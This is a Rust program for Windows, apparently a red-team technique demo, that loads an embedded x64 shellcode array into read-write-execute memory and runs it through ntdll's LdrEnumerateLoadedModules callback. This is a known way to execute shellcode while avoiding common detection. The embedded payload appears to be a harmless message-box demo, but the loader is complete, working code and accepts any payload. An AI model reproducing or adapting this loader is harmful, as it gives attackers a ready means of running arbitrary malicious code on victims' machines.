/*
    Shellcode Execute using LdrEnumerateLoadedModules
    .
*/

use std::ptr::null_mut;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
use winapi::shared::ntdef::NTSTATUS;
use winapi::shared::minwindef::{HMODULE, BOOL};
use std::ffi::c_void;
use std::ffi::CString;


static OP: [u8; 328] = [
    0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
    0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
    0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
    0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
    0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
    0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
    0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
    0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
    0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
    0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
    0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
    0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
    0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
    0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
    0x48,0x8d,0x8d,0x30,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
    0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
    0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x24,0x01,
    0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
    0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
    0x48,0x65,0x79,0x20,0x6d,0x61,0x6e,0x2e,0x20,0x49,0x74,0x73,
    0x20,0x6d,0x65,0x20,0x53,0x6d,0x75,0x6b,0x78,0x00,0x6b,0x6e,
    0x6f,0x63,0x6b,0x2d,0x6b,0x6e,0x6f,0x63,0x6b,0x00,0x75,0x73,
    0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00
];


type LdrEnumerateLoadedModules = unsafe extern "stdcall" fn(
    BOOL,
    extern "stdcall" fn(*mut c_void, *mut c_void, *mut bool),
    *mut c_void,
) -> NTSTATUS;

fn main() {
    unsafe {
        let address = VirtualAlloc(
            null_mut(),
            OP.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        if address.is_null() {
            eprintln!("Failed to allocate memory");
            return;
        }

        std::ptr::copy_nonoverlapping(OP.as_ptr(), address as *mut u8, OP.len());

        let h_ntdll: HMODULE = GetModuleHandleW(windows_wide_string("ntdll.dll").as_ptr());
        if h_ntdll.is_null() {
            eprintln!("Failed to get ntdll handle");
            return;
        }

        let func_name = CString::new("LdrEnumerateLoadedModules").unwrap();
        let ldr_enumerate= GetProcAddress(h_ntdll, func_name.as_ptr());
        if ldr_enumerate.is_null() {
            eprintln!("Failed to get LdrEnumerateLoadedModules address");
            return;
        }

        let ldr_enum_func: LdrEnumerateLoadedModules = std::mem::transmute(ldr_enumerate);

        let callback: extern "stdcall" fn(*mut c_void, *mut c_void, *mut bool) =
            std::mem::transmute(address);

        ldr_enum_func(0, callback, null_mut());
    }
}

fn windows_wide_string(input: &str) -> Vec<u16> {
    use std::iter::once;
    input.encode_utf16().chain(once(0)).collect()
}

